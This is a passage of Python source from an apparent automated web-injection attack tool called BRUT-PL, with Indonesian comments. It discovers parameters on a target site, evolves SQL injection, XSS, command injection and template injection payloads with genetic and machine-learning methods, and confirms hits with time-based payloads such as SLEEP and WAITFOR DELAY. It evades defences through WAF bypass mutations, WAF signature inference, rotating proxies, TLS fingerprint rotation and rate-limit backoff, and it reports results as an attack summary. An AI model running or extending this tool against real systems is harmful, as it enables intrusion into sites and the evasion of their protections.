                    "genetic": evolver.get_generation_summary() if evolver else "",
                    "proxy_stats": proxy_manager.get_pool_stats() if proxy_manager else {},
                    "throttle_stats": throttler.get_stats() if throttler else {},
                    "version": "6.0.1",
                    "confirmed_vulnerabilities": confirmer.confirmed_vulnerabilities
                        if confirmer and hasattr(confirmer, 'confirmed_vulnerabilities')
                        else []
                },
                "server_response": [r.to_dict() for r in server],
                "raw_html": [r.to_dict() for r in raw],
                "blocked": [r.to_dict() for r in blocked],
                "all_payloads": payloads,
                "evolution_log": schema.get_evolution_log() if schema else [],
                "blocked_mutations": list(schema.blocked_mutations) if schema else [],
                "successful_chains": schema.successful_chains if schema else [],
                "rate_limit_events": schema.rate_limit_events if schema else [],
            }, f, indent=2, ensure_ascii=False)
                
        return txt_path, json_path
        
            
   
# ============================================================
# DETAILED LOGGER (v6.0 enhanced with proxy/TLS info)
# ============================================================
class DetailedLogger:
    """Menampilkan hasil setiap request dengan status dan metadata ringkas."""
    @staticmethod
    def log_result(index, total, result):
        if result.success:
            symbol = "\033[1;32m[✓]\033[0m"
        elif result.response_type == "raw_html":
            symbol = "\033[37m[~]\033[0m"
        elif result.status_code == 429:
            symbol = "\033[1;33m[⏳]\033[0m"
        else:
            symbol = "\033[31m[✗]\033[0m"

        status_str = f"\033[33m{result.status_code}\033[0m"
        status_meaning = get_status_meaning(result.status_code)
        time_str = f"\033[36m{result.response_time_ms:.0f}ms\033[0m"

        if result.response_type == "server_output":
            type_label = "\033[1;32mSERVER OUTPUT\033[0m"
        elif result.status_code == 429:
            type_label = "\033[1;33mRATE LIMITED\033[0m"
        elif result.response_type == "raw_html":
            type_label = "\033[37mraw HTML\033[0m"
        else:
            type_label = "\033[31mBLOCKED\033[0m"

        payload_display = result.payload[:80].replace('\n', '\\n').replace('\r', '\\r')
        if len(result.payload) > 80: payload_display += "..."
        snippet = result.response_snippet[:60].replace('\n', ' ').replace('\r', '')

        proxy_short = result.proxy_used[:25] if result.proxy_used else "DIRECT"
        tls_short = result.tls_fingerprint[:15] if result.tls_fingerprint else "N/A"

        print(f"  {symbol} \033[33m[{index}/{total}]\033[0m "
              f"\033[35m{result.category:<8}\033[0m → "
              f"\033[37m{result.parameter:<12}\033[0m | "
              f"{type_label} | "
              f"Status: {status_str} ({status_meaning[:20]}) | "
              f"⏱ {time_str}")

        print(f"         \033[90mPayload : \033[0m{payload_display}")
        if snippet and result.status_code != 429:
            print(f"         \033[90mResponse: \033[0m{snippet}")
        print(f"         \033[90mProxy   : \033[0m{proxy_short} | "
              f"\033[90mTLS: \033[0m{tls_short}")
        if result.success:
            print(f"         \033[1;32m⚡ Evidence: {result.evidence}\033[0m")
            print(f"         \033[1;36m📍 Context: {result.injection_context} | "
                  f"Anomaly: {result.anomaly_score:.1f}\033[0m")
            print()

# ============================================================
# SECOND-ORDER CONFIRMATION ENGINE (v6.2 — False Positive Reduction)
# ============================================================

class SecondOrderConfirmer:
    """
    Melakukan verifikasi tambahan untuk memastikan bahwa indikasi injeksi
    bukan false positive, dengan mengirimkan payload verifikasi (misal SLEEP)
    dan membandingkan waktu respons.
    """
    
    def __init__(self, time_threshold: float = 1.5, retry_count: int = 2):
        """
        Args:
            time_threshold: Perbedaan waktu minimum (detik) untuk dianggap sukses.
            retry_count: Berapa kali verifikasi diulang untuk rata-rata.
        """
        self.time_threshold = time_threshold
        self.retry_count = retry_count
        self.confirmed_vulnerabilities: List[Dict] = []
        
    def should_verify(self, result: InjectionResult) -> bool:
        """Tentukan apakah sebuah hasil perlu diverifikasi lebih lanjut."""
        # Jika sudah jelas server_output, verifikasi tetap baik untuk konfirmasi
        if result.response_type == "server_output":
            return True
        # Jika ada anomaly tinggi tapi bukan server_output, coba verifikasi
        if result.anomaly_score > 70:
            return True
        # Jika status code 500 dan ada indikasi error, verifikasi
        if result.status_code >= 500:
            return True
        return False
        
    def generate_verification_payload(self, original_payload: str, category: str) -> str:
        """Buat payload verifikasi berdasarkan kategori."""
        if category == "sqli":
            # Gunakan SLEEP atau benchmark
            delay = random.randint(3, 7)
            variants = [
                f"' OR SLEEP({delay})-- -",
                f"' AND SLEEP({delay})-- -",
                f"'; WAITFOR DELAY '0:0:{delay}'-- -",
                f"' OR BENCHMARK(10000000,MD5(0x1))-- -",
            ]
            return random.choice(variants)
        elif category == "xss":
            # Untuk XSS, coba refleksi sederhana
            return f"<script>alert('XSS-{random.randint(1000,9999)}')</script>"
        elif category == "cmdi":
            return f";sleep {random.randint(3,7)}"
        elif category == "ssti":
            return f"{{{{ {random.randint(100,999)} * {random.randint(100,999)} }}}}"
        else:
            # Default: tambahkan null byte atau encoding
            return original_payload + "%00"
            
    def verify(self, injector: Injector, param: Parameter, original_result: InjectionResult) -> Tuple[bool, str]:
        """
        Kirim payload verifikasi dan bandingkan waktu respons.
        Returns: (is_confirmed, evidence)
        """
        # Buat payload verifikasi
        verif_payload = self.generate_verification_payload(
            original_result.payload, original_result.category
        )
        
        # Simulasikan payload dict dengan payload verifikasi
        verif_payload_dict = {
            "id": f"VERIFY-{uuid.uuid4().hex[:8]}",
            "payload": verif_payload,
            "category": original_result.category,
            "generation_id": "",
            "mutation_history": ["verification"],
        }
        
        # Kirim request pertama (baseline) tanpa payload verifikasi (atau dengan payload netral)
        baseline_payload = "1"  # payload netral
        baseline_dict = {
            "id": "BASELINE",
            "payload": baseline_payload,
            "category": original_result.category,
        }
        baseline_result = injector.inject(param, baseline_dict)
        if baseline_result.status_code == 0:
            return False, "Baseline request failed"
        
        # Kirim request verifikasi beberapa kali
        times = []
        for i in range(self.retry_count):
            result = injector.inject(param, verif_payload_dict)
            if result.status_code == 0:
                continue
            times.append(result.response_time_ms / 1000.0)  # konversi ke detik
        
        if not times:
            return False, "All verification requests failed"
        
        avg_time = sum(times) / len(times)
        baseline_time = baseline_result.response_time_ms / 1000.0
        
        # Bandingkan waktu
        time_diff = avg_time - baseline_time
        if time_diff > self.time_threshold:
            # Sukses: ada perbedaan waktu signifikan
            evidence = f"Time-based confirmation: +{time_diff:.2f}s (threshold: {self.time_threshold}s)"
            self.confirmed_vulnerabilities.append({
                "parameter": param.name,
                "category": original_result.category,
                "original_payload": original_result.payload[:100],
                "verification_payload": verif_payload[:100],
                "time_diff": time_diff,
                "timestamp": datetime.now().isoformat(),
            })
            return True, evidence
        else:
            return False, f"Time diff too small: {time_diff:.2f}s < {self.time_threshold}s"

# ============================================================
# MAIN PIPELINE v6.0.1
# ============================================================
class BRUTPipeline:
    """Mengorkestrasi discovery, pembuatan payload, injection, dan pelaporan."""
    def __init__(self, target, proxy_file: str = None):
        self.target = target
        self.parameters: List[Parameter] = []
        self.payloads: List[Dict] = []
        self.results: List[InjectionResult] = []

        self.proxy_manager = ProxyPoolManager()
        if proxy_file:
            self.proxy_manager.load_proxies_from_file(proxy_file)
        self.tls_engine = TLSFingerprintEngine()
        self.throttler = AdaptiveThrottler()
        self.last_elapsed = 0.0
        self.baseline_responses = {}

        self.learner = FeedbackLearner()
        self.schema = EvolutionSchema()
        self.grammar = GrammarValidator()
        self.encoder = AdaptiveEncodingRotation()
        self.waf_bypass = WAFBypassEngine()
        self.waf_inference = WAFSignatureInference()
        self.polyglot = PolyglotGenerator()
        self.context_detector = ContextDetector()

        self.generator = MLPayloadGenerator(
            self.learner, self.grammar, self.encoder,
            self.waf_bypass, self.polyglot
        )

        self.evolver = GeneticEvolver(
            self.schema, self.grammar, self.encoder, self.waf_bypass,
            waf_inference=self.waf_inference
        )

        self.retry_engine = RetryEngine(
            self.throttler, self.proxy_manager, self.tls_engine
        )

        self.injector = Injector(
            target,
            proxy_manager=self.proxy_manager,
            tls_engine=self.tls_engine,
            throttler=self.throttler,
            retry_engine=self.retry_engine,
        )
        
        # v6.1 NEW
        self.bandit = HybridBanditSelector(
            mutation_types=[
                "case_variation", "comment_insertion", "whitespace_padding",
                "char_encoding", "null_byte_append", "double_encoding",
                "keyword_split", "alternative_syntax", "newline_injection",
                "tab_separation", "url_encode", "hex_encode",
                "hpp_split", "control_char_insert", "waf_fragment"
            ],
            exploration_constant=2.0
        )
        self.lstm_generator = CharLevelLSTMGenerator(hidden_size=128, num_layers=2, seq_length=20)
        self.reward_engine = GranularRewardEngine()
        # v6.2: Second-Order Confirmation
        self.confirmer = SecondOrderConfirmer(time_threshold=1.5, retry_count=2)
        self.evolver.bandit = self.bandit  # pass ke evolver

		# v7.0 NEW: Payload Diversity Engine
        self.diversity_engine = PayloadDiversityEngine()

        # v7.0 NEW (Batch 6): Statistical Anomaly Detector
        self.anomaly_detector = StatisticalAnomalyDetector()

        # v7.0 NEW (Batch 7): Domain Scope Validator + Fast HTML Parser + Async Scanner
        self.scope_validator = DomainScopeValidator(target)
        self.fast_parser = FastHTMLParser()
        self.async_scanner = AsyncEndpointScanner(base_url=target, timeout=5.0)

        # v7.0 NEW (Batch 5): Concurrent Endpoint Scanner
        self.endpoint_scanner = ConcurrentEndpointScanner(
            base_url=target,
            max_workers=8,
            timeout=5.0
        )
        self.discovered_endpoints = []
 
        self.saver = ReportSaver(target)
        self.logger = DetailedLogger()

    def phase1_discover(self):
        """Menemukan parameter dan endpoint yang berada dalam scope target."""
        discovery = ParameterDiscovery(self.target)
        self.parameters = discovery.run()
        return self.parameters

    def phase2_generate(self, count):
        """Membuat sejumlah payload tervalidasi dan menginisialisasi populasinya."""
        if count <= 0: return []
        self.payloads = self.generator.generate(count)
        self.evolver.initialize_population(self.payloads)
        for p in self.payloads:
            record = self.schema.create_record(p)
            p["generation_id"] = record.generation_id
        return self.payloads

    def phase3_inject(self, max_mode=False):
        """Menguji kombinasi payload-parameter dengan kontrol adaptif dan retry."""
        self.results = []
        total = len(self.payloads) * len(self.parameters)
        tested = 0
        found_success = False
        rate_limit_count = 0

        print(f"\n\033[36m[*]\033[0m Starting injection: "
              f"{len(self.payloads)} payloads × {len(self.parameters)} parameters")
        print(f"    Total: {total} | Mode: {'MAX' if max_mode else 'NORMAL'}")
        print(f"    Genetic: Active | Grammar: Validated | Encoding: {self.encoder.get_rotation_summary()}")

        proxy_stats = self.proxy_manager.get_pool_stats()
        tls_fp = self.tls_engine.get_current_fingerprint()
        print(f"    Proxy: {proxy_stats['total']} proxies ({proxy_stats['healthy']} healthy) | "
              f"TLS: {tls_fp}")
        print(f"    Throttle: {self.throttler.min_delay}-{self.throttler.max_delay}s jitter | "
              f"Backoff: auto")
        print(f"\033[33m{'─'*100}\033[0m")
        
        # v7.0 FIX C5: Reset WAF state di awal setiap phase3
        self.schema.waf_type = "Unknown"
        self.schema.waf_confidence = 0.0
        self.schema.waf_history = []

        # v7.0 NEW (Batch 5+7): Parallel endpoint discovery (sync + async)
        try:
            self.discovered_endpoints = self.endpoint_scanner.scan()
            if self.discovered_endpoints:
                print(f"  \033[1;36m[SCANNER]\033[0m Discovered "
                      f"{len(self.discovered_endpoints)} live endpoints via "
                      f"ThreadPoolExecutor (HTTPAdapter+Retry)")
                for ep in self.discovered_endpoints[:5]:
                    print(f"    \033[90m→ {ep['url']} [{ep['status_code']}]\033[0m")
        except Exception:
            pass

        # v7.0 NEW (Batch 7): Async endpoint discovery (aiohttp)
        try:
            async_endpoints = self.async_scanner.scan()
            if async_endpoints:
                # Deduplikasi dengan hasil sync scanner
                existing_urls = {ep["url"] for ep in self.discovered_endpoints}
                new_async = [ep for ep in async_endpoints if ep["url"] not in existing_urls]
                if new_async:
                    self.discovered_endpoints.extend(new_async)
                    print(f"  \033[1;36m[ASYNC-SCANNER]\033[0m Discovered "
                          f"{len(new_async)} additional endpoints via aiohttp")
        except Exception:
            pass

        # v7.0 NEW (Batch 7): Domain scope validation
        try:
            registered_domain = self.scope_validator.get_registered_domain()
            print(f"  \033[1;36m[SCOPE]\033[0m Target domain: {registered_domain}")
        except Exception:
            pass

        for param in self.parameters:
            if max_mode and found_success: break
            # v7.0 (Batch 3): Check cancel event setiap ganti parameter
            if CANCEL_EVENT.is_set():
                print(f"\n  \033[1;31m[✗ CANCELLED]\033[0m Proses dibatalkan oleh user.")
                break
            for payload_dict in self.payloads:
                # v7.0 (Batch 3): Check cancel event setiap payload
                if CANCEL_EVENT.is_set():
                    print(f"\n  \033[1;31m[✗ CANCELLED]\033[0m Proses dibatalkan oleh user.")
                    break
                tested += 1
                payload = payload_dict.get("payload", "")
                result = self.injector.inject(param, payload_dict)

                if result:
                    self.results.append(result)
                    self.learner.record_feedback(payload_dict, result)
                    
                    # v7.0 FIX C2+C5: Sinkronisasi WAF source
                    # FeedbackLearner._detect_waf() sudah mengisi learner.waf_type
                    # Sekarang sinkronkan ke schema agar Bandit & mutate() bisa pakai
                    if self.learner.waf_detected and self.learner.waf_type:
                        old_waf = self.schema.waf_type
                        self.schema.waf_type = self.learner.waf_type
                        self.schema.waf_confidence = 0.9
                        
                        # Konfirmasi tambahan via WAFFingerprinter (rule-based body analysis)
                        try:
                            fp_response = {
                                "headers": {},
                                "status_code": result.status_code,
                                "body": result.response_snippet or result.evidence or ""
                            }
                            fp_waf, fp_conf = self.schema.waf_fingerprinter.predict(fp_response)
                            if fp_waf != "Unknown":
                                self.schema.waf_type = fp_waf
                                self.schema.waf_confidence = fp_conf
                        except Exception:
                            pass
                        
                        # Log jika WAF berubah
                        if old_waf != self.schema.waf_type:
                            print(f"  \033[1;35m[WAF-SYNC]\033[0m WAF updated: "
                                  f"'{old_waf}' → '{self.schema.waf_type}' "
                                  f"(conf: {self.schema.waf_confidence:.0%})")
                            self.schema.waf_history.append({
                                "waf_type": self.schema.waf_type,
                                "confidence": self.schema.waf_confidence,
                                "source": "learner+fingerprinter",
                                "timestamp": datetime.now().isoformat()
                            })
                    
                    # v6.2: Feed data ke WAF Inference Engine
                    self.waf_inference.record_result(
                        payload=payload,
                        response_text=result.response_snippet or "",
                        was_blocked=(result.response_type == "blocked")
                    )
                    
                    # v7.0 NEW: Differential WAF Learning — infer signature tiap 25 payload
                    # Hanya berjalan jika sudah ada cukup data blocked
                    if (tested % 25 == 0 and 
                            len(self.waf_inference.blocked_payloads) >= self.waf_inference.min_occurrences):
                        inferred = self.waf_inference.infer_signatures()
                        if inferred:
                            print(f"  \033[1;35m[WAF-LEARN]\033[0m Inferred {len(inferred)} "
                                  f"WAF signatures from {len(self.waf_inference.blocked_payloads)} blocked payloads")
                            print(f"  \033[1;35m[WAF-LEARN]\033[0m {self.waf_inference.get_signature_summary()}")
                    
                    # === v6.1 NEW: Granular Reward & Backoff ===
                    
                    # 1. Hitung reward granular berdasarkan respons
                    # === v7.0 FIX C3: Baseline Response Management ===
                    param_key = f"{param.name}:{param.url}"
                    if param_key not in self.baseline_responses:
                        self.baseline_responses[param_key] = {
                            "body": result.response_snippet or "",
                            "status_code": result.status_code,
                            "size": result.response_size,
                            "elapsed": result.response_time_ms / 1000.0,
                            "headers": {}
                        }
                    
                    baseline = self.baseline_responses[param_key]

                    # === v7.0 NEW (Batch 6): Statistical Anomaly Detection ===
                    try:
                        current_ms = result.response_time_ms or 0.0
                        current_body = result.response_snippet or ""
                        self.anomaly_detector.record_response_time(current_ms)
                        stat_anomaly = self.anomaly_detector.anomaly_score(
                            current_ms=current_ms,
                            current_body=current_body,
                            baseline_body=baseline.get("body", "")
                        )
                        if stat_anomaly > 0.4:
                            print(f"    \033[1;33m[STAT-ANOMALY]\033[0m "
                                  f"score={stat_anomaly:.2f} "
                                  f"(timing={current_ms:.0f}ms)")
                    except Exception:
                        stat_anomaly = 0.0
                    # === END Batch 6 ===
                    
                    # === v6.1 NEW + v7.0: Granular Reward & Backoff ===
                    
                    # 1. Hitung reward granular berdasarkan respons (dengan baseline)
                    granular_reward = self.reward_engine.calculate_reward(
                        response={
                            "status_code": result.status_code,
                            "headers": {},
                            "body": result.response_snippet or "",
                            "elapsed": result.response_time_ms / 1000.0
                        },
                        baseline_response=baseline,
                        payload=payload,
                        is_rate_limited=(result.status_code == 429),
                        is_ip_blocked=(result.status_code in [403, 406, 999]),
                        baseline_body=baseline.get("body", ""),
                        baseline_headers=baseline.get("headers", {})
                    )
                    
                    # v7.0 (Batch 6): Boost reward jika statistical anomaly terdeteksi
                    if stat_anomaly > 0.4:
                        granular_reward += 0.3 * stat_anomaly
                        granular_reward = min(1.0, granular_reward)                  
                    
                    # 2. Update bandit dengan reward yang dihitung
                    muts = payload_dict.get("mutation_history", [])
                    waf_type = getattr(self.schema, 'waf_type', '') or ''
                    for mut in muts:
                        self.evolver.bandit.update_reward(
                            mut, granular_reward, waf_type=waf_type
                        )
                    
                    # 3. v6.1 FINAL: Aggressive Cluster Blacklist
                    if result.response_type == "blocked":
                        # Blacklist cluster payload ini
                        self.schema.clusterer.blacklist_cluster(payload)
                        
                        # v6.1 FINAL: Juga blacklist payload serupa di populasi
                        # agar tidak membuang waktu menguji varian yang sama
                        blacklisted_count = 0
                        remaining_pop = []
                        for cand in self.evolver.population:
                            cand_payload = cand.get("payload", "")
                            if self.schema.clusterer.is_blacklisted(cand_payload):
                                blacklisted_count += 1
                            else:
                                remaining_pop.append(cand)
                        
                        if blacklisted_count > 0:
                            self.evolver.population = remaining_pop
                            print(f"    \033[33m[CLUSTER]\033[0m Removed {blacklisted_count} "
                                  f"similar payloads from population")
                    
                    # v6.1 FINAL: Juga blacklist pada filtered (bukan hanya blocked)
                    elif result.response_type == "filtered" and result.status_code in [403, 406]:
                        self.schema.clusterer.blacklist_cluster(payload)
                    
                    # 4. Backoff otomatis jika terkena 429
                    if result.status_code == 429:
                        should_backoff, backoff_time = self.reward_engine.should_backoff(
                            result.status_code, {}
                        )
                        if should_backoff:
                            print(f"  \033[1;33m[429 BACKOFF]\033[0m Rate limited! "
                                  f"Sleeping {backoff_time:.1f}s before continuing...")
                            time.sleep(backoff_time)
                            self.throttler.record_rate_limited(429)
                    
                    # 5. Progressive penalty: tambah delay jika 403/429
                    if result.status_code in [403, 429]:
                        self.schema.rate_limit_events.append({
                            "status": result.status_code,
                            "timestamp": time.time(),
                            "payload_hash": payload_dict.get("hash", "")
                        })
                        # Jika 3+ rate limit dalam 60 detik, tambah delay ekstra
                        recent_events = [
                            e for e in self.schema.rate_limit_events
                            if time.time() - e["timestamp"] < 60
                        ]
                        if len(recent_events) >= 3:
                            extra_delay = min(30, len(recent_events) * 5)
                            print(f"  \033[1;31m[PROGRESSIVE PENALTY]\033[0m "
                                  f"{len(recent_events)} blocks in 60s! "
                                  f"Extra cooldown: {extra_delay}s")
                            time.sleep(extra_delay)

                    gen_id = payload_dict.get("generation_id", "")
                    if gen_id:
                        self.schema.record_feedback(
                            gen_id, result.status_code,
                            result.evidence, result.response_type,
                            result.anomaly_score,
                            self.learner.waf_type if self.learner.waf_detected else "",
                            proxy_used=result.proxy_used,
                            tls_fp=result.tls_fingerprint,
                            throttle_delay=result.throttle_delay_ms / 1000.0,
                        )

                    fitness = self.schema.records.get(gen_id, None)
                    if fitness:
                        self.evolver.update_fitness(
                            payload_dict["id"], fitness.fitness_score
                        )

                    self.encoder.record_result(
                        self.encoder.current_chain_index, result.success
                    )

                    self.logger.log_result(tested, total, result)
                    # === v6.2: Second-Order Confirmation ===
                    if self.confirmer.should_verify(result):
                        # Hanya verifikasi jika ada indikasi
                        is_confirmed, evidence = self.confirmer.verify(
                            self.injector, param, result
                        )
                        if is_confirmed:
                            # Tandai result sebagai terkonfirmasi
                            result.success = True
                            result.response_type = "server_output"
                            result.evidence = f"[CONFIRMED] {evidence}"
                            print(f"  \033[1;32m[✓ CONFIRMED]\033[0m {result.parameter} → {evidence}")
                        else:
                            # Jika tidak terkonfirmasi, turunkan skor atau tandai
                            print(f"  \033[33m[? UNCONFIRMED]\033[0m {result.parameter} → {evidence}")

                    if result.status_code == 429:
                        rate_limit_count += 1
                        if rate_limit_count % 5 == 0:
                            print(f"\n  \033[1;33m[RATE LIMIT]\033[0m "
                                  f"{rate_limit_count} rate limits encountered. "
                                  f"Throttler adapting...")
                            self.throttler.print_stats()
                            self.proxy_manager.print_pool_status()
                            print()

                    if result.success:
                        found_success = True
                        if max_mode: break

                if tested % 50 == 0 and tested > 0:
                    ml = self.learner.get_learning_summary()
                    if ml != "Learning...":
                        print(f"\n  \033[1;36m[ML]\033[0m {ml}")
                        print(f"  \033[1;36m[GENETIC]\033[0m {self.evolver.get_generation_summary()}")
                        print(f"  \033[1;36m[ENCODING]\033[0m {self.encoder.get_rotation_summary()}")
                        self.throttler.print_stats()
                        print()

                if tested % 100 == 0 and tested > 0:
                    new_pop = self.evolver.evolve_generation()
                    
                    # v7.0 NEW: Suntikkan payload diversifikasi setiap evolusi
                    diversity_batch = self.diversity_engine.diversify_batch(new_pop, count=5)
                    if diversity_batch:
                        new_pop.extend(diversity_batch)
                        print(f"  \033[1;36m[DIVERSITY]\033[0m Injected {len(diversity_batch)} "
                              f"diversified payloads")
                    
                    print(f"\n  \033[1;35m[EVOLUTION]\033[0m Generation {self.evolver.generation}: "
                          f"{len(new_pop)} evolved payloads ready")
                    self.tls_engine._rotate_target()
                    print(f"  \033[1;35m[TLS]\033[0m Fingerprint rotated to: "
                          f"{self.tls_engine.get_current_fingerprint()}\n")
                    self.payloads = new_pop
                    for p in self.payloads:
                        if "generation_id" not in p:
                            record = self.schema.create_record(p)
                            p["generation_id"] = record.generation_id

        # === v6.1 NEW: Post-Attack ML Training ===
        
        # Train LSTM pada payload yang berhasil (server_output)
        server_results = [r for r in self.results if r.response_type == "server_output"]
        if server_results and len(server_results) >= 3:
            success_payloads = [r.payload for r in server_results]
            try:
                # v6.1 NEW: Buat dan latih LSTM
                self.lstm_generator = CharLevelLSTMGenerator(hidden_size=128, num_layers=2, seq_length=20)
                self.lstm_generator.train(success_payloads, epochs=50, lr=0.005)
                print(f"  \033[1;36m[LSTM]\033[0m Trained on {len(success_payloads)} "
                      f"successful payloads")
                
                # v6.1 NEW: Hubungkan ke evolver & suntikkan payload AI
                self.evolver.lstm_generator = self.lstm_generator
                lstm_candidates = self.evolver.generate_lstm_candidates(num_candidates=10)
                if lstm_candidates:
                    self.evolver.population.extend(lstm_candidates)
                    print(f"  \033[1;36m[LSTM]\033[0m Injected {len(lstm_candidates)} "
                          f"AI-generated payloads into next evolution batch")
            except Exception as e:
                print(f"  \033[33m[LSTM]\033[0m Training/Generation skipped: {e}")

        # Fit semantic clusterer pada semua payload yang diuji
        all_payloads_str = [r.payload for r in self.results if r.payload]
        if len(all_payloads_str) >= 5:
            try:
                self.schema.clusterer.fit(all_payloads_str)
                cluster_stats = self.schema.clusterer.get_cluster_stats()
                print(f"  \033[1;36m[CLUSTER]\033[0m {cluster_stats['num_clusters']} "
                      f"clusters formed, {cluster_stats['blacklisted_clusters']} blacklisted, "
                      f"{cluster_stats['clustered_payloads']}/{cluster_stats['total_payloads']} "
                      f"payloads clustered")
            except Exception as e:
                print(f"  \033[33m[CLUSTER]\033[0m Clustering skipped: {e}")
        
        # v7.0 (Batch 8): KMeans response clustering — identifikasi pola respons anomali
        try:
            all_bodies = [r.response_snippet for r in self.results if r.response_snippet and len(r.response_snippet) > 10]
            if len(all_bodies) >= 4:
                response_labels = self.anomaly_detector.cluster_responses(all_bodies, n_clusters=3)
                unique_labels = set(response_labels)
                print(f"  \033[1;36m[KMEANS]\033[0m Clustered {len(all_bodies)} responses "
                      f"into {len(unique_labels)} groups")
                # Simpan label untuk analisis
                self.anomaly_detector.labels_history = response_labels
                self.anomaly_detector.response_bodies = all_bodies
        except Exception:
            pass        
        
        # Print bandit performance summary
        bandit_stats = self.evolver.bandit.get_stats()
        print(f"  \033[1;36m[BANDIT]\033[0m Total selections: "
              f"{bandit_stats['total_selections']}, "
              f"Overall success rate: {bandit_stats['overall_success_rate']:.1%}")
        if bandit_stats['top_mutations']:
            print(f"    Top mutations:")
            for m in bandit_stats['top_mutations']:
                print(f"      • {m['mutation']}: {m['success_rate']:.1%} "
                      f"({m['successes']}/{m['attempts']})")

        # === v6.1 FINAL: Finish phase3 ===
        return self._finish_phase3()

    def generate_advanced_report(self) -> Dict:
        """Generate comprehensive attack report with metrics and export to JSON."""
        import json
        from datetime import datetime
        
        # === Kumpulkan Metrik ===
        total_payloads = len(self.results)
        if total_payloads == 0:
            return {"status": "no_results"}
        
        # Hitung distribusi response type
        response_dist = {}
        for r in self.results:
            rt = r.response_type or "unknown"
            response_dist[rt] = response_dist.get(rt, 0) + 1
        
        # Hitung distribusi status code
        status_dist = {}
        for r in self.results:
            sc = r.status_code or 0
            status_dist[str(sc)] = status_dist.get(str(sc), 0) + 1
        
        # Hitung metrik kunci
        successful = response_dist.get("server_output", 0)
        blocked = response_dist.get("blocked", 0)
        filtered = response_dist.get("filtered", 0)
        rate_limited = status_dist.get("429", 0)
        
        success_rate = successful / total_payloads if total_payloads > 0 else 0
        block_rate = blocked / total_payloads if total_payloads > 0 else 0
        
        # Bandit statistics
        bandit_stats = {}
        try:
            bandit_stats = self.evolver.bandit.get_stats()
        except Exception:
            pass
        
        # WAF detection summary
        waf_summary = {
            "detected_type": getattr(self.schema, 'waf_type', 'Unknown'),
            "confidence": getattr(self.schema, 'waf_confidence', 0.0),
            "detection_count": len(getattr(self.schema, 'waf_history', []))
        }
        
        # Cluster statistics
        cluster_stats = {}
        try:
            cluster_stats = self.schema.clusterer.get_cluster_stats()
        except Exception:
            pass
        
        # Payload categories breakdown
        category_dist = {}
        for r in self.results:
            cat = getattr(r, 'category', 'unknown') or 'unknown'
            category_dist[cat] = category_dist.get(cat, 0) + 1
        
        # Response time statistics
        response_times = [r.response_time_ms for r in self.results if r.response_time_ms > 0]
        time_stats = {}
        if response_times:
            time_stats = {
                "avg_ms": sum(response_times) / len(response_times),
                "min_ms": min(response_times),
                "max_ms": max(response_times),
                "median_ms": sorted(response_times)[len(response_times) // 2]
            }
        
        # === Bangun Laporan Lengkap ===
        report = {
            "report_metadata": {
                "generated_at": datetime.now().isoformat(),
                "target": self.target,
                "brutpl_version": "v6.1-final",
                "total_payloads_tested": total_payloads
            },
            "summary": {
                "success_rate": f"{success_rate:.1%}",
                "block_rate": f"{block_rate:.1%}",
                "successful_payloads": successful,
                "blocked_payloads": blocked,
                "filtered_payloads": filtered,
                "rate_limited_count": rate_limited
            },
            "response_distribution": response_dist,
            "status_code_distribution": status_dist,
            "category_distribution": category_dist,
            "response_time_stats": time_stats,
            "waf_detection": waf_summary,
            "bandit_performance": bandit_stats,
            "cluster_analysis": cluster_stats,
            "successful_payloads": [
                {"payload": r.payload, "category": getattr(r, 'category', ''), 
                 "response_time_ms": r.response_time_ms}
                for r in self.results if r.response_type == "server_output"
            ][:50],  # Top 50 successful
            "top_mutations": bandit_stats.get('top_mutations', [])[:10]
        }
        
        # === Export ke JSON ===
        try:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            safe_target = self.target.replace("://", "_").replace("/", "_").replace(":", "_")[:50]
            filename = f"brutpl_report_{safe_target}_{timestamp}.json"
            
            with open(filename, 'w', encoding='utf-8') as f:
                json.dump(report, f, indent=2, ensure_ascii=False, default=str)
            
            print(f"\n  \033[1;32m[REPORT]\033[0m Advanced report exported to: \033[1m{filename}\033[0m")
        except Exception as e:
            print(f"  \033[33m[REPORT]\033[0m Export failed: {e}")
        
        # === Print Ringkasan Visual ===
        print(f"\n  \033[1;36m{'═'*60}\033[0m")
        print(f"  \033[1;36m  BRUT-PL v6.1 FINAL ATTACK SUMMARY\033[0m")
        print(f"  \033[1;36m{'═'*60}\033[0m")
        print(f"  Target:          {self.target}")
        print(f"  Total Payloads:  {total_payloads}")
        print(f"  Success Rate:    \033[1;32m{success_rate:.1%}\033[0m ({successful} payloads)")
        print(f"  Block Rate:      \033[1;31m{block_rate:.1%}\033[0m ({blocked} payloads)")
        print(f"  WAF Detected:    {waf_summary['detected_type']} "
              f"(confidence: {waf_summary['confidence']:.0%})")
        
        if time_stats:
            print(f"  Avg Response:    {time_stats['avg_ms']:.0f}ms "
                  f"(min: {time_stats['min_ms']:.0f}ms, max: {time_stats['max_ms']:.0f}ms)")
        
        if cluster_stats:
            print(f"  Clusters:        {cluster_stats.get('num_clusters', 0)} formed, "
                  f"{cluster_stats.get('blacklisted_clusters', 0)} blacklisted")
        
        if bandit_stats and bandit_stats.get('top_mutations'):
            print(f"\n  \033[1;36m  Top 5 Mutations:\033[0m")
            for m in bandit_stats['top_mutations'][:5]:
                print(f"    • {m['mutation']}: {m['success_rate']:.1%} "
                      f"({m['successes']}/{m['attempts']})")
        
        print(f"  \033[1;36m{'═'*60}\033[0m")
        
        return report

    def _finish_phase3(self):
        """Called at the end of phase3_inject to generate report and return results."""
        print(f"\033[33m{'─'*100}\033[0m")
        # === v6.1 FINAL: Generate Advanced Report ===
        try:
            self.generate_advanced_report()
        except Exception as e:
            print(f"  \033[33m[REPORT]\033[0m Report generation failed: {e}")
        
        print(f"\033[33m{'─'*100}\033[0m")
        return self.results

    def phase3_advanced_retry(self):
        """Menguji varian lanjutan dari hasil blocked atau respons biasa."""
        failed = [r for r in self.results if r.response_type in ["raw_html", "blocked"]]
        if not failed: return []

        print(f"\n\033[33m[*]\033[0m ML evolving: advanced variants from {len(failed)} failed...")
        print(f"    Negative selection: {len(self.learner.blocked_mutations)} mutations blacklisted")

        failed_dicts = [{"id": r.payload_id, "category": r.category, "payload": r.payload}
                        for r in failed]
        adv = self.generator.generate_advanced_batch(failed_dicts)
        print(f"    Generated {len(adv)} advanced variants\n")

        adv_results = []
        total_adv = len(adv) * len(self.parameters)
        tested = 0

        for param in self.parameters:
            for pd in adv:
                tested += 1
                result = self.injector.inject(param, pd)
                if result:
                    adv_results.append(result)
                    self.learner.record_feedback(pd, result)
                    self.logger.log_result(tested, total_adv, result)

        self.results.extend(adv_results)
        return adv_results

    def phase4_save(self, confirmer=None):
